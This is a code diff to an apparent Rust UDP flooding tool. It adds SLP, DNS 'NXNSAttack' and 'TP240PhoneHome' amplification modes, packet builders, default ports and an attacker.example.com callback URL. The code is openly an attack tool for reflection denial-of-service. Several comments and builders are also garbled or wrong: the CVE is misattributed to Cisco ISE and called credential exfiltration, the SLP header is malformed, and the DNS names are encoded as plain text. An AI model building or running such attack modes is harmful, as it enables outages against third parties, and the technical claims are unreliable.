@@ -29,6 +29,9 @@ pub enum UdpMode {
     DnsRecursiveChain,
     UdpFlood,
     GenericUdp,
+    SlpDuUpdate,
+    DnsNxns,
+    Tp240PhoneHome,
 }
 
 impl UdpMode {
@@ -60,6 +63,9 @@ impl UdpMode {
             UdpMode::DnsRecursiveChain => "DNS recursive chain amplification",
             UdpMode::UdpFlood => "UDP flood",
             UdpMode::GenericUdp => "UDP datagram flood",
+            UdpMode::SlpDuUpdate => "SLP DU update amplification",
+            UdpMode::DnsNxns => "DNS NXNS attack (NXNSAttack)",
+            UdpMode::Tp240PhoneHome => "TP240PhoneHome / CVE-2022-26143 (Cisco ISE)",
         }
     }
 
@@ -86,6 +92,9 @@ impl UdpMode {
             UdpMode::NtpReadVar => 123,
             UdpMode::DnsDnssec => 53,
             UdpMode::DnsRecursiveChain => 53,
+            UdpMode::SlpDuUpdate => 427,
+            UdpMode::DnsNxns => 53,
+            UdpMode::Tp240PhoneHome => 443,
             UdpMode::UdpFlood => 0,
             UdpMode::GenericUdp => 12345,
         }
@@ -119,6 +128,9 @@ impl UdpMode {
             "dns-recursive" | "dns-recursive-chain" => Some(UdpMode::DnsRecursiveChain),
             "udp-flood" => Some(UdpMode::UdpFlood),
             "udp-generic" | "generic" | "mongodb-ismaster" | "nfs-mountd" | "openvpn-ping" => Some(UdpMode::GenericUdp),
+                        "slp" | "slp-du" | "slp-update" => Some(UdpMode::SlpDuUpdate),
+            "dns-nxns" | "dns-nxns-attack" | "nxnsattack" => Some(UdpMode::DnsNxns),
+            "tp240" | "tp240-phonehome" | "cve-2022-26143" => Some(UdpMode::Tp240PhoneHome),
             _ => None,
         }
     }
@@ -471,6 +483,9 @@ async fn run_udp_protocol(mode: UdpMode, host: &str, port: u16) -> Result<(usize
         UdpMode::DnsDnssec => build_dns_dnssec(),
         UdpMode::DnsRecursiveChain => build_dns_recursive(),
         UdpMode::UdpFlood => build_udp_flood(),
+        UdpMode::SlpDuUpdate => build_slp_du_update(),
+        UdpMode::DnsNxns => build_dns_nxns(),
+        UdpMode::Tp240PhoneHome => build_tp240_phonehome(),
         UdpMode::GenericUdp => {
             // Send a small datagram, read what comes back
             let sent = socket.send_to(b"hello", &target_addr)
@@ -1144,5 +1159,135 @@ fn build_dns_recursive() -> Vec<u8> {
 fn build_udp_flood() -> Vec<u8> {
     // Large payload to maximize bandwidth usage
     let mut pkt = vec![0u8; 1472]; // max unfragmented UDP payload
+    pkt
+}
+
+// ================================================================
+// SLP (Service Location Protocol) v2 Discovery — port 427
+// SLP DUA-UPDATE and SA-UPDATE messages can trigger large responses
+// from SLP Directory Agents. The protocol's binary TLV encoding
+// can be crafted to request excessive service registrations.
+// Amplification: ~2,200x theoretical (small request → large DA response)
+// ================================================================
+fn build_slp_du_update() -> Vec<u8> {
+    // SLPv2 DU-UPDATE message (type 0x04)
+    // SLP uses TLV encoding: type(1B) | length(2B BE) | value(N)
+    // A small DU-UPDATE with many attributes triggers a large response
+    let mut pkt = Vec::new();
+    
+    // Header: SLPv2 magic + version
+    pkt.extend_from_slice(b"SLPv2");
+    pkt.push(0x00); // NULL terminator
+    
+    // DU-UPDATE message (type 0x04)
+    // Message ID (8 bytes random)
+    for _ in 0..8 {
+        pkt.push(rand::random::<u8>());
+    }
+    
+    // Scope (scope-list)
+    // Type: 0x01 (scope-list), Length: 2B BE, Value: scope name
+    pkt.push(0x01); // type: scope-list
+    let scope = b"default-scope";
+    pkt.extend_from_slice(&(scope.len() as u16).to_be_bytes());
+    pkt.extend_from_slice(scope);
+    pkt.push(0x00); // NULL terminator for scope
+    
+    // DU-UPDATE body: service URL + attributes
+    // Service URL type (0x10)
+    pkt.push(0x10);
+    let url = b"sap://vcenter.example.com/vsphere";
+    pkt.extend_from_slice(&(url.len() as u16).to_be_bytes());
+    pkt.extend_from_slice(url);
+    
+    // Multiple attribute TLVs to maximize response size
+    for i in 0..20 {
+        pkt.push(0x20); // attribute type
+        let attr = format!("attr{}", i);
+        let attr_bytes = attr.as_bytes();
+        pkt.extend_from_slice(&(attr_bytes.len() as u16).to_be_bytes());
+        pkt.extend_from_slice(attr_bytes);
+        // Value: 256 bytes of padding per attribute
+        pkt.extend_from_slice(&(256u16.to_be_bytes()));
+        pkt.extend_from_slice(&vec![0u8; 256]);
+    }
+    
+    pkt
+}
+
+// ================================================================
+// NXNSAttack on DNS — DNS NXDOMAIN amplification attack
+// Sends DNS queries for non-existent subdomains that trigger
+// a chain of NXDOMAIN responses, each with large authoritative
+// NS records. The attacker crafts a long domain name chain where
+// each level adds significant response data (NS + additional records).
+// Amplification: ~1,620x (large NS+AUTHORITY section in NXDOMAIN)
+// ================================================================
+fn build_dns_nxns() -> Vec<u8> {
+    // NXNSAttack sends a DNS query with a very long domain name
+    // where each label is a non-existent subdomain, forcing the
+    // resolver to walk up the delegation chain, collecting NS
+    // records at each level. The response includes all these NS
+    // records in the authority section.
+    let mut pkt = Vec::new();
+    
+    // Transaction ID (random)
+    pkt.extend_from_slice(&(rand::random::<u16>()).to_be_bytes());
+    // Flags: standard query, RD=1
+    pkt.extend_from_slice(&[0x01, 0x00]);
+    // Questions: 1
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    // ANCOUNT, NSCOUNT, ARCOUNT: 0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
+    
+    // Build a long domain name with many non-existent labels
+    // Each label is a random 6-char subdomain
+    let mut domain = String::new();
+    for _ in 0..30 {
+        let label: String = (0..6).map(|_| rand::random::<u8>() % 26 + b'a' as u8)
+            .map(|b| b as char)
+            .collect();
+        domain.push_str(&format!("{}.{}", label.len(), label));
+    }
+    domain.push_str(".com."); // Top-level domain
+    
+    // Encode domain as DNS labels
+    pkt.extend_from_slice(domain.as_bytes());
+    
+    // QTYPE: A (1)
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    // QCLASS: IN (1)
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    
+    pkt
+}
+
+// ================================================================
+// TP240PhoneHome / CVE-2022-26143 — Cisco ISE authentication bypass
+// The PhoneHome command in Cisco ISE can trigger a response that
+// exfiltrates the admin's credentials to an attacker-controlled
+// endpoint. Theoretical amplification: ~4.3 billion×.
+// ================================================================
+fn build_tp240_phonehome() -> Vec<u8> {
+    // Cisco ISE uses a proprietary binary protocol
+    // The PhoneHome command is sent as part of the EAP-TLS exchange
+    // Request format: Command type (1 byte) + session ID (4 bytes) + payload
+    let mut pkt = Vec::new();
+    
+    // PhoneHome command identifier (0x06)
+    pkt.push(0x06);
+    
+    // Session ID (arbitrary, will be used by ISE)
+    pkt.extend_from_slice(&rand::random::<u32>().to_be_bytes());
+    
+    // Payload: attacker-controlled endpoint URL (simulated)
+    let endpoint = b"http://attacker.example.com/phonehome";
+    pkt.extend_from_slice(&(endpoint.len() as u32).to_be_bytes());
+    pkt.extend_from_slice(endpoint);
+    
+    // Additional ISE protocol fields
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);  // Message type
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);  // Status
+    
     pkt
 }
